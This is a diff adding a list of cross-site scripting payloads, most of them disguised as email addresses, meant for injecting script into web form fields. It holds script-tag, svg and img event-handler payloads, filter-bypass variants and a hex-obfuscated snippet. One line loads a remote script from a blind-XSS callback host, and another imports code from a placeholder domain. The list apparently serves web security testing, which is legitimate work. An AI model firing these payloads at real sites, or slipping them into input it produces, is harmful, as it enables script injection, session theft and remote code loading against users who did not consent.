@@ -1,0 +1,14 @@
+test+(<script>alert(0)</script>)@example.com
+test@example(<script>alert(0)</script>).com
+"<script>alert(0)</script>"@example.com
+"'--><script/src=//hunterxbxss.bxss.in></script>"@mail.local
+"<img/src/onerror=alert(5)>"@mail.local
+name(<script>alert(5)</script>)@mail.local
+name@mail(<script>alert(5)</script>).local
+ab@gmail.com'\"><svg/onload=alert(/xss/)>
+"><img/src/onerror=import('//domain/')>"@yourdomain
+<Svg/OnLoad=alert(1337)>"@gmail.com
+<a href="#" id="uniqueLink">Click me</a> <script> (function() { var a = ['\x6F\x70\x65\x6E', '\x77\x72\x69\x74\x65', '\x63\x6C\x6F\x73\x65', '\x70\x72\x69\x6E\x74', '\x61\x6C\x65\x72\x74']; var b = ['@', 'h', 'x', 'l', 'x', 'm', 'j']; var c = ['B', '1', 'P', '4', '$', '$']; document.getElementById('uniqueLink').onclick = function() { var w = window[a[0]](); w.document[a[1]](b.join('')); w.document[a[2]](); w[a[3]](); window[a[4]](c.join('')); }; })(); </script>
+<select><noembed></select><script x='a@b'a> y='a@b'//a@b%0a\u0061lert('HUNTERX')</script x>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+"><svg/onload=alert('Hacked')>"@x.y
